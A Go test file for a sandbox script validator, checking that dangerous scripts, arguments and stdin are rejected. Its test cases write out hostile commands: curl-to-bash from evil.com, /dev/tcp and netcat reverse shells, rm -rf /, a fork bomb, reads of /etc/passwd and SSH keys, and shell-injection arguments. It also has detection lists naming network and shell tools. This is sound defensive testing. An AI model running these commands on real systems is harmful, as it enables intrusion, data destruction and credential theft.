package sandbox

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestScriptValidator_ValidateScript(t *testing.T) {
	v := NewScriptValidator()

	tests := []struct {
		name       string
		content    string
		shouldFail bool
		errorType  string
	}{
		{
			name:       "safe python script",
			content:    `print("Hello, World!")`,
			shouldFail: false,
		},
		{
			name:       "safe bash script",
			content:    `#!/bin/bash\necho "Hello"`,
			shouldFail: false,
		},
		{
			name:       "dangerous rm -rf /",
			content:    `rm -rf /`,
			shouldFail: true,
			errorType:  "dangerous_command",
		},
		{
			name:       "curl pipe to bash",
			content:    `curl http://evil.com/script.sh | bash`,
			shouldFail: true,
			errorType:  "dangerous_pattern",
		},
		{
			name:       "reverse shell pattern",
			content:    `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`,
			shouldFail: true,
			errorType:  "reverse_shell",
		},
		{
			name:       "python os.system",
			content:    `os.system("rm -rf /")`,
			shouldFail: true,
			errorType:  "dangerous_pattern",
		},
		{
			name:       "python subprocess with shell=True",
			content:    `subprocess.call("ls", shell=True)`,
			shouldFail: true,
			errorType:  "dangerous_pattern",
		},
		{
			name:       "eval function",
			content:    `eval(user_input)`,
			shouldFail: true,
			errorType:  "dangerous_pattern",
		},
		{
			name:       "base64 decode execution",
			content:    `echo "..." | base64 -d | bash`,
			shouldFail: true,
			errorType:  "dangerous_pattern",
		},
		{
			name:       "network access curl",
			content:    `curl https://example.com`,
			shouldFail: true,
			errorType:  "network_access",
		},
		{
			name:       "network access wget",
			content:    `wget https://example.com`,
			shouldFail: true,
			errorType:  "network_access",
		},
		{
			name:       "python requests",
			content:    `requests.get("https://example.com")`,
			shouldFail: true,
			errorType:  "network_access",
		},
		{
			name:       "docker command",
			content:    `docker run ubuntu`,
			shouldFail: true,
			errorType:  "dangerous_command",
		},
		{
			name:       "kubectl command",
			content:    `kubectl get pods`,
			shouldFail: true,
			errorType:  "dangerous_command",
		},
		{
			name:       "fork bomb",
			content:    `:(){:|:&};:`,
			shouldFail: true,
			errorType:  "dangerous_command",
		},
		{
			name:       "python pickle load",
			content:    `pickle.load(file)`,
			shouldFail: true,
			errorType:  "dangerous_pattern",
		},
		{
			name:       "access /etc/passwd",
			content:    `cat /etc/passwd`,
			shouldFail: true,
			errorType:  "dangerous_command",
		},
		{
			name:       "ssh key access",
			content:    `cat ~/.ssh/id_rsa`,
			shouldFail: true,
			errorType:  "dangerous_command",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := v.ValidateScript(tt.content)

			if tt.shouldFail && result.Valid {
				t.Errorf("expected validation to fail but it passed")
			}

			if !tt.shouldFail && !result.Valid {
				t.Errorf("expected validation to pass but it failed: %v", result.Errors)
			}

			if tt.shouldFail && !result.Valid && tt.errorType != "" {
				found := false
				for _, err := range result.Errors {
					if err.Type == tt.errorType {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected error type %s but got: %v", tt.errorType, result.Errors)
				}
			}
		})
	}
}

func TestScriptValidator_ValidateArgs(t *testing.T) {
	v := NewScriptValidator()

	tests := []struct {
		name       string
		args       []string
		shouldFail bool
		errorType  string
	}{
		{
			name:       "safe args",
			args:       []string{"--input", "file.txt", "--output", "result.json"},
			shouldFail: false,
		},
		{
			name:       "command chaining with semicolon",
			args:       []string{"--input", "file.txt; rm -rf /"},
			shouldFail: true,
			errorType:  "shell_injection",
		},
		{
			name:       "command chaining with &&",
			args:       []string{"file.txt && rm -rf /"},
			shouldFail: true,
			errorType:  "shell_injection",
		},
		{
			name:       "command chaining with ||",
			args:       []string{"file.txt || cat /etc/passwd"},
			shouldFail: true,
			errorType:  "shell_injection",
		},
		{
			name:       "pipe injection",
			args:       []string{"input | cat /etc/passwd"},
			shouldFail: true,
			errorType:  "shell_injection",
		},
		{
			name:       "command substitution $(...)",
			args:       []string{"$(whoami)"},
			shouldFail: true,
			errorType:  "command_substitution",
		},
		{
			name:       "command substitution backtick",
			args:       []string{"`whoami`"},
			shouldFail: true,
			errorType:  "command_substitution",
		},
		{
			name:       "output redirection",
			args:       []string{"> /etc/passwd"},
			shouldFail: true,
			errorType:  "shell_injection",
		},
		{
			name:       "newline injection",
			args:       []string{"file.txt\nrm -rf /"},
			shouldFail: true,
			errorType:  "shell_injection",
		},
		{
			name:       "path traversal",
			args:       []string{"../../../etc/passwd"},
			shouldFail: true,
			errorType:  "arg_injection",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := v.ValidateArgs(tt.args)

			if tt.shouldFail && result.Valid {
				t.Errorf("expected validation to fail but it passed")
			}

			if !tt.shouldFail && !result.Valid {
				t.Errorf("expected validation to pass but it failed: %v", result.Errors)
			}

			if tt.shouldFail && !result.Valid && tt.errorType != "" {
				found := false
				for _, err := range result.Errors {
					if err.Type == tt.errorType {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected error type %s but got: %v", tt.errorType, result.Errors)
				}
			}
		})
	}
}

func TestScriptValidator_ValidateStdin(t *testing.T) {
	v := NewScriptValidator()

	tests := []struct {
		name       string
		stdin      string
		shouldFail bool
	}{
		{
			name:       "safe data",
			stdin:      `{"key": "value", "number": 123}`,
			shouldFail: false,
		},
		{
			name:       "plain text",
			stdin:      "Hello, World!",
			shouldFail: false,
		},
		{
			name:       "command substitution",
			stdin:      "data $(rm -rf /)",
			shouldFail: true,
		},
		{
			name:       "backtick command",
			stdin:      "data `whoami`",
			shouldFail: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := v.ValidateStdin(tt.stdin)

			if tt.shouldFail && result.Valid {
				t.Errorf("expected validation to fail but it passed")
			}

			if !tt.shouldFail && !result.Valid {
				t.Errorf("expected validation to pass but it failed: %v", result.Errors)
			}
		})
	}
}

func TestScriptValidator_ValidateAll(t *testing.T) {
	v := NewScriptValidator()

	// Test comprehensive validation
	result := v.ValidateAll(
		`print("Hello")`,                // safe script
		[]string{"--input", "file.txt"}, // safe args
		`{"data": "value"}`,             // safe stdin
	)

	if !result.Valid {
		t.Errorf("expected comprehensive validation to pass but it failed: %v", result.Errors)
	}

	// Test with dangerous script
	result = v.ValidateAll(
		`os.system("rm -rf /")`,
		[]string{"--input", "file.txt"},
		`{"data": "value"}`,
	)

	if result.Valid {
		t.Errorf("expected comprehensive validation to fail but it passed")
	}

	// Test with dangerous args
	result = v.ValidateAll(
		`print("Hello")`,
		[]string{"--input", "file.txt; rm -rf /"},
		`{"data": "value"}`,
	)

	if result.Valid {
		t.Errorf("expected comprehensive validation to fail due to dangerous args but it passed")
	}
}

func TestValidationError_Error(t *testing.T) {
	err := &ValidationError{
		Type:    "dangerous_command",
		Pattern: "rm -rf",
		Context: "rm -rf /",
		Message: "Script contains dangerous command",
	}

	errStr := err.Error()
	if errStr == "" {
		t.Error("Error() should return non-empty string")
	}

	if !contains(errStr, "dangerous_command") {
		t.Error("Error() should contain error type")
	}
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsHelper(s, substr))
}

func containsHelper(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func BenchmarkValidateArgs(b *testing.B) {
	v := NewScriptValidator()
	args := []string{"--input", "file.txt", "--name", "report 2024", "--out", "/tmp/x", "--verbose", "--limit=50"}
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_ = v.ValidateArgs(args)
	}
}

func TestHasNetworkAccess(t *testing.T) {
	v := NewScriptValidator()

	tests := []struct {
		name    string
		content string
		want    bool
	}{
		{"curl", "curl http://example.com", true},
		{"wget", "wget http://example.com", true},
		{"nc", "nc -l 8080", true},
		{"netcat", "netcat example.com 80", true},
		{"telnet", "telnet example.com 23", true},
		{"ssh", "ssh user@host", true},
		{"scp", "scp file user@host:/path", true},
		{"rsync", "rsync -av src/ dst/", true},
		{"ftp", "ftp example.com", true},
		{"sftp", "sftp user@host", true},
		{"socket.connect", "socket.connect('host', 80)", true},
		{"urllib.request", "urllib.request.urlopen('url')", true},
		{"requests.get", "requests.get('url')", true},
		{"requests.post", "requests.post('url')", true},
		{"http.client", "http.client.HTTPConnection('host')", true},
		{"httplib", "httplib.HTTPConnection('host')", true},
		{"fetch", "fetch('http://example.com')", true},
		{"axios", "axios.get('url')", true},
		{"XMLHttpRequest", "new XMLHttpRequest()", true},
		{"safe print", `print("Hello")`, false},
		{"safe math", "x = 1 + 2", false},
		{"safe string", "s = 'hello world'", false},
		{"curl in word", "occurrence of word", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := v.hasNetworkAccess(tt.content)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestHasReverseShellPattern(t *testing.T) {
	v := NewScriptValidator()

	tests := []struct {
		name    string
		content string
		want    bool
	}{
		{"dev tcp", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", true},
		{"dev udp", "/dev/udp/host/port", true},
		{"bash -i", "bash -i", true},
		{"sh -i", "sh -i", true},
		{"bin bash -i", "/bin/bash -i", true},
		{"bin sh -i", "/bin/sh -i", true},
		{"python pty.spawn", "python -c 'import pty; pty.spawn(\"/bin/bash\")'", true},
		{"perl socket", "perl -e 'use Socket'", true},
		{"ruby rsocket", "ruby -rsocket -e '...'", true},
		{"socat exec", "socat exec:'bash -li' tcp:host:port", true},
		{"mkfifo", "mkfifo /tmp/pipe", true},
		{"mknod p", "mknod pipe p", true},
		{"fd redirect 0<&196", "0<&196", true},
		{"fd redirect 196>&0", "196>&0", true},
		{"inet tcp", "/inet/tcp/0/host/port", true},
		{"bash redirect", "bash -i >& /dev/tcp/host/port 0>&1", true},
		{"nc -e", "nc -e /bin/bash host port", true},
		{"ncat -e", "ncat -e /bin/bash host port", true},
		{"netcat -e", "netcat -e /bin/bash host port", true},
		{"safe print", `print("Hello")`, false},
		{"safe math", "x = 1 + 2", false},
		{"safe echo", `echo "hello"`, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := v.hasReverseShellPattern(tt.content)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestHasEmbeddedShellCommands(t *testing.T) {
	v := NewScriptValidator()

	tests := []struct {
		name    string
		content string
		want    bool
	}{
		{"command substitution", "data $(rm -rf /)", true},
		{"backtick substitution", "data `whoami`", true},
		{"newline semicolon", "data\n; rm -rf /", true},
		{"escaped newline semicolon", "data\\n; rm -rf /", true},
		{"safe json", `{"key": "value"}`, false},
		{"safe text", "Hello, World!", false},
		{"safe number", "12345", false},
		{"safe multiline json", `{"key": "value", "num": 123}`, false},
		{"safe xml", `<root><item>text</item></root>`, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := v.hasEmbeddedShellCommands(tt.content)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestHasShellOperators(t *testing.T) {
	v := NewScriptValidator()

	tests := []struct {
		name string
		s    string
		want bool
	}{
		{"and operator", "cmd1 && cmd2", true},
		{"or operator", "cmd1 || cmd2", true},
		{"semicolon", "cmd1; cmd2", true},
		{"pipe", "cmd1 | cmd2", true},
		{"newline", "cmd1\ncmd2", true},
		{"carriage return", "cmd1\rcmd2", true},
		{"dollar paren", "$(whoami)", true},
		{"backtick", "`whoami`", true},
		{"redirect out", "> file", true},
		{"redirect in", "< file", true},
		{"append", ">> file", true},
		{"stderr redirect", "2> file", true},
		{"combined redirect", "&> file", true},
		{"safe string", "hello world", false},
		{"safe arg", "--input=file.txt", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := v.hasShellOperators(tt.s)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestHasCommandSubstitution(t *testing.T) {
	v := NewScriptValidator()

	tests := []struct {
		name string
		s    string
		want bool
	}{
		{"dollar paren", "$(whoami)", true},
		{"backtick", "`whoami`", true},
		{"nested", "${var$(cmd)}", true},
		{"safe", "hello world", false},
		{"safe with dollar", "$HOME", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := v.hasCommandSubstitution(tt.s)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestTruncate(t *testing.T) {
	assert.Equal(t, "hello", truncate("hello", 10))
	assert.Equal(t, "hel...", truncate("hello world", 3))
	assert.Equal(t, "", truncate("", 10))
	assert.Equal(t, "exact", truncate("exact", 5))
}

func TestExtractContext(t *testing.T) {
	// Match at the beginning
	ctx := extractContext("rm -rf / is dangerous", "rm -rf /")
	assert.NotEmpty(t, ctx)

	// No match
	ctx = extractContext("hello world", "nonexistent")
	assert.Empty(t, ctx)

	// Match in the middle
	ctx = extractContext("this is a rm -rf / command in a long string", "rm -rf /")
	assert.NotEmpty(t, ctx)
	assert.Contains(t, ctx, "...")
}

func TestCompilePatterns(t *testing.T) {
	// Valid patterns
	patterns := []string{`rm\s+-rf`, `eval\s*\(`}
	compiled := compilePatterns(patterns)
	assert.Len(t, compiled, 2)

	// Invalid pattern should be skipped
	invalidPatterns := []string{`[`, `valid`}
	compiled = compilePatterns(invalidPatterns)
	assert.Len(t, compiled, 1)

	// Empty list
	compiled = compilePatterns([]string{})
	assert.Empty(t, compiled)
}

func TestValidationError_Error_Format(t *testing.T) {
	err := &ValidationError{
		Type:    "test_type",
		Pattern: "test_pattern",
		Context: "test_context",
		Message: "test message",
	}
	str := err.Error()
	assert.Contains(t, str, "test_type")
	assert.Contains(t, str, "test_pattern")
	assert.Contains(t, str, "test_context")
	assert.Contains(t, str, "test message")
}
